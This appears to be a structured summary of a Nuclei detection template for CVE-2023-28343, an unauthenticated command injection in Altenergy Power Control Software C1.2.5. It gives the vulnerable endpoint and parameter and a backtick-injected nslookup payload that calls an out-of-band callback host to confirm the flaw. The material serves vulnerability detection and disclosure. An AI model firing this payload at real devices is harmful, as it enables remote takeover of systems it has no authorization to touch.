---
cve_id: CVE-2023-28343
template_path: nuclei-templates/http/cves/2023/CVE-2023-28343.yaml
affected_product: Altenergy Power Control Software
severity: critical
authentication: none
external_callback: true
affected_versions: C1.2.5
preconditions: []
poc_classification: rce
---

## Vulnerability
Altenergy Power Control Software C1.2.5 is vulnerable to remote command injection (CVE-2023-28343, CWE-78) via unsanitized shell metacharacters in the `timezone` parameter of `/index.php/management/set_timezone` (processed by `models/management_model.php`). 

Unauthenticated remote attackers can execute arbitrary OS commands, enabling full system compromise: sensitive data exfiltration, data modification, and unauthorized operations. 

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (score 9.8). CPE: cpe:2.3:o:apsystems:energy_communication_unit_firmware:c1.2.5:*:*:*:*:*:*:*

## PoC / Detection
Classification: rce

The template sends a single POST request to `/index.php/management/set_timezone` with payload `timezone=`nslookup {{interactsh-url}}`` (Content-Type application/x-www-form-urlencoded). It verifies the RCE condition by matching:
- HTTP status 200
- body contains "Time Zone updated successfully"
- header contains "text/html"
- interactsh_protocol contains "dns" (confirming out-of-band callback)

## References
- https://github.com/ahmedalroky/Disclosures/blob/main/apesystems/os_command_injection.md
- https://apsystems.com
- http://packetstormsecurity.com/files/171775/Altenergy-Power-Control-Software-C1.2.5-Command-Injection.html
- https://nvd.nist.gov/vuln/detail/CVE-2023-28343
- https://github.com/hba343434/CVE-2023-28343
